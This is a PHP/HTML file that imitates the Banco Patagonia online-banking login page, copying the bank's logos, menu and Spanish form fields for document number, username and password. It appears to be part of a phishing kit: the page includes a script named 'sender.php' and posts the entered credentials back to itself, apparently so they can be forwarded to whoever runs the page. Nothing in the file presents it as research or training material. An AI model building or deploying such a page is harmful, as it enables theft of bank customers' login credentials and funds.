<?php 
include 'sender.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/css.css">
	<title>Patagonia | online</title>
</head>
<body>
	<div class="patagonia-design">
		<header>
			<div class="navBrand">
				<div class="brands">
					<img src="img/HeaderLogoEbank.gif">
				</div>
				<div class="brands">
					<img src="img/HeaderLogoPatagonia.gif">
				</div>
			</div>
			<nav class="ul-flex">
				<ul>
					<li>
					<a href="">Sucursales y Cajeros</a>
					</li>
					<li>|</li>
					<li>
						<a href="">Ayuda</a>
					</li>
					<li>|</li>
					<li>
						<a href="">Contáctenos</a>
					</li>
				</ul>
			</nav>
		</header>
		<section class="patagonia-login">
			<form method="POST">
				<div class="modal-header">
					<img src="img/bienvenido.gif">
				</div>
				<div class="title">
					<h1>Seleccione Documento o Usuario para ingresar.</h1>
				</div>
				<div class="radios">
					<input type="radio" name="seleccioneopcion" id="docbutton" checked>
					<label>Documento</label>
					<input type="radio" name="seleccioneopcion" id="usbutton">
					<label>Usuario</label>
				</div>
				<div class="input-design" id="fieldDoc">
					<label>Documento</label>
					<select name="opcion">
						<option>DNI</option>
						<option>CI</option>
						<option>PASAPORTE</option>
						<option>LC</option>
						<option>LE</option>
					</select>
					<input type="" name="documento">
				</div>

				<div class="input-design" id="fieldUsu">
					<label>Usuario</label>
					
					<input type="" name="usuario" >
					<a href="">Olvide mi usuario</a>
				</div>

				<div class="input-design">
					<label>Clave</label>
					
					<input type="password" maxlength="8" name="clave" required id="passInput">
					<a href="">Olvide mi clave</a>
				</div>
				<div class="ingresar-center">
					<button name="submit" id="buttonSubmit" type="submit">Ingresar</button>
				</div>
				<div class="dotted"></div>
				<div class="footer-form">
					<b>Si olvidaste usuario y clave o para operar por primera vez</b>
					<button>Crear usuario y clave</button>
				</div>
			</form>
			<img src="img/NuevaDefault_ClubPatagonia_430x310_1667218748348.jpg">
		</section>
		<section class="footer-img">
			<img src="img/Sintítulo.jpg">
		</section>
	</div>
	<script type="text/javascript" src="js/main.js"></script>
</body>
</html>